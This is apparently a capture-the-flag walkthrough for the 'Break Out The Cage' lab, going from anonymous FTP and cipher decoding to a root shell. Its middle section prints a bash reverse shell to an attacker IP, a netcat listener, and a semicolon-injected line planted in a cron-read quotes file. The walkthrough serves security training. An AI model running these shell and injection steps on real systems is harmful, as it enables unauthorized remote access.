# Break Out The Cage

Help Cage bring back his acting career and investigate the nefarious goings on of his agent!

Let's find out what his agent is up to....

# #1 - What is Weston's password?

## Services

There are 3 ports open on the server:

~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25 23:33 dad_tasks
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.0.54
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Nicholas Cage Stories
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## HTTP

Here is what the website looks like:

!["homepage.png"](files/homepage.png)

There is no `robots.txt` file, but dirsearch found several hidden directories:

* http://10.10.151.64/images/
* http://10.10.151.64/html/
* http://10.10.151.64/scripts/
* http://10.10.151.64/contracts/
* http://10.10.151.64/auditions/

However, none of these directories reveals Weston's password.

## FTP

The FTP service supports `anonymous` connections, and we are able to download a file named `dad_tasks`:

~~~
$ ftp 10.10.151.64
Connected to 10.10.151.64 (10.10.151.64).
220 (vsFTPd 3.0.3)
Name (10.10.151.64:unknown): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
227 Entering Passive Mode (10,10,44,133,149,130).
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 25 23:32 .
drwxr-xr-x    2 0        0            4096 May 25 23:32 ..
-rw-r--r--    1 0        0             396 May 25 23:33 dad_tasks
226 Directory send OK.
ftp> get dad_tasks
local: dad_tasks remote: dad_tasks
227 Entering Passive Mode (10,10,44,133,128,236).
150 Opening BINARY mode data connection for dad_tasks (396 bytes).
226 Transfer complete.
396 bytes received in 0.0493 secs (8.03 Kbytes/sec)
ftp> 221 Goodbye.
~~~

The file is encoded with base64 > Vigenere. You can use [this website](https://www.guballa.de/vigenere-solver) to brute force the Vigenere key. Once decoded, the message is:

~~~
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
~~~

Weston's password is: `Mydadisghostrideraintthatcoolnocausehesonfirejokes`

# #2 - What's the user flag?

Let's connect to SSH with `weston:Mydadisghostrideraintthatcoolnocausehesonfirejokes`.

We are successfully connected as `weston` but there is no `user.txt` flag anywhere on the server (at least with our permissions).

Let's check our permissions:

~~~
weston@national-treasure:~$ sudo -l
[sudo] password for weston: 
Matching Defaults entries for weston on national-treasure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User weston may run the following commands on national-treasure:
    (root) /usr/bin/bees
~~~

We can execute `/usr/bin/bees` as `root`. The program is owned by `root`:

~~~
weston@national-treasure:~$ ls -l /usr/bin/bees 
-rwxr-xr-x 1 root root 56 May 25 23:35 /usr/bin/bees
~~~

When run, here is the output:

~~~
weston@national-treasure:~$ sudo /usr/bin/bees 
                                                                               
Broadcast message from weston@national-treasure (pts/0) (Wed Jun 17 21:10:04 20
                                                                               
AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!
~~~

It's a simple `bash` script that displays a message using `wall`:

~~~
weston@national-treasure:~$ cat /usr/bin/bees 
#!/bin/bash

wall "AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"
~~~

More interesting thing appears when looking for files owned by `cage`, the other user:

~~~
weston@national-treasure:~$ find / -type f -user cage 2>/dev/null
/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files/.quotes
~~~

A python script seems to be scheduled as a cronjob to execute `wall` and display random messages:

~~~
weston@national-treasure:~$ cat /opt/.dads_scripts/spread_the_quotes.py
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
~~~

Random messages are stored in the `/opt/.dads_scripts/.files/.quotes` file:

~~~
weston@national-treasure:~$ cat /opt/.dads_scripts/.files/.quotes
"That's funny, my name's Roger. Two Rogers don't make a right!" — Gone in Sixty Seconds
"Did I ever tell ya that this here jacket represents a symbol of my individuality, and my belief in personal freedom?" — Wild at Heart
"Well, I'm one of those fortunate people who like my job, sir. Got my first chemistry set when I was seven, blew my eyebrows off, we never saw the cat again, been into it ever since." — The Rock

[REDACTED]

"Here's something that if you want your father to think you're not a silly ****, don't slap a guy across the face with a glove because if you do that, that's what he will think. Unless you're a noble man or something in the nineteenth century. Which I am not." — The Weather Man
"It's like we're on two different channels now. I'm CNN and she's the Home Shopping Network." — It Could Happen to You
~~~

We can exploit this by replacing the content of the file with a reverse shell.

Open a listener on your machine:

~~~
$ rlwrap nc -nlvp 4444
~~~

Execute the following commands on the remote machine to create a reverse shell and overwrite the content of the file called by the script, to call our reverse shell: 

~~~
$ cat > /tmp/shell.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/10.9.0.54/4444 0>&1
EOF
$ chmod +x /tmp/shell.sh
$ printf 'anything;/tmp/shell.sh\n' > /opt/.dads_scripts/.files/.quotes
~~~

After 2 minutes or so, you'll get a reverse shell and will be connected as `cage`. The flag appears in a file named `Super_Duper_Checklist` in cage's `home` folder.

~~~
cage@national-treasure:~$ cat Super_Duper_Checklist
cat Super_Duper_Checklist
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{M37AL_0R_P3N_T35T1NG}
~~~

User flag: `THM{M37AL_0R_P3N_T35T1NG}`

# #3 - What's the root flag?

Still in cage's `home` folder, we can find a directory named `email_backup` containing 3 emails:

~~~
cage@national-treasure:~$ cat email_backup/*
cat email_backup/*
From - SeanArcher@BigManAgents.com
To - Cage@nationaltreasure.com

Hey Cage!

There's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the
planning stages at the moment. I've put a good word in for you, if you're lucky we 
might be able to get you a part of an angry shop keeping or something? Would you be up
for that, the money would be good and it'd look good on your acting CV.

Regards

Sean Archer
-----------------------------------------------
From - Cage@nationaltreasure.com
To - SeanArcher@BigManAgents.com

Dear Sean

We've had this discussion before Sean, I want bigger roles, I'm meant for greater things.
Why aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!),
the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the
new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.
I could of made them great... great Sean.... I think you're missing my true potential.

On a much lighter note thank you for helping me set up my home server, Weston helped too, but
not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?

Yours

Cage
-----------------------------------------------
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage
~~~

The last email has been sent by cage to his son weston. It contains a weird string (`haiinspsyanileph`) which we can decode with Vigenere and the key `face`.

Could the decoded string (`cageisnotalegend`) be the root password? Let's try:

~~~
cage@national-treasure:~$ su root
su root
Password: cageisnotalegend
~~~

Perfect! Now, let's check the `/root` directory:

~~~
root@national-treasure:~# ls -la
ll
total 52
drwx------  8 root root  4096 May 26 09:16 ./
drwxr-xr-x 24 root root  4096 May 26 07:51 ../
lrwxrwxrwx  1 root root     9 May 26 07:52 .bash_history -> /dev/null
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 May 26 08:15 .cache/
drwxr-xr-x  2 root root  4096 May 25 19:25 email_backup/
drwx------  3 root root  4096 May 26 08:15 .gnupg/
drwxr-xr-x  3 root root  4096 May 25 23:31 .local/
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
drwx------  2 root root  4096 May 25 23:19 .ssh/
drwxr-xr-x  2 root root  4096 May 26 08:36 .vim/
-rw-------  1 root root 11692 May 26 09:16 .viminfo
~~~

Same thing as for cage, there is an `email_backup` directory in which we find the flag:

~~~
root@national-treasure:~# cd email_backup
cd email_backup
root@national-treasure:~/email_backup# ls -la
ll
total 16
drwxr-xr-x 2 root root 4096 May 25 19:25 ./
drwx------ 8 root root 4096 May 26 09:16 ../
-rw-r--r-- 1 root root  318 May 25 13:19 email_1
-rw-r--r-- 1 root root  414 May 25 14:00 email_2
root@national-treasure:~/email_backup# cat email_1
cat email_1
From - SeanArcher@BigManAgents.com
To - master@ActorsGuild.com

Good Evening Master

My control over Cage is becoming stronger, I've been casting him into worse and worse roles.
Eventually the whole world will see who Cage really is! Our masterplan is coming together
master, I'm in your debt.

Thank you

Sean Archer
root@national-treasure:~/email_backup# cat email_2
cat email_2
From - master@ActorsGuild.com
To - SeanArcher@BigManAgents.com

Dear Sean

I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
strong... so strong that I feel the power to promote you from disciple to crony. I hope you
don't abuse your new found strength. To ascend yourself to this level please use this code:

THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}

Thank you

Sean Archer
root@national-treasure:~/email_backup# 
~~~

Root flag: `THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}`
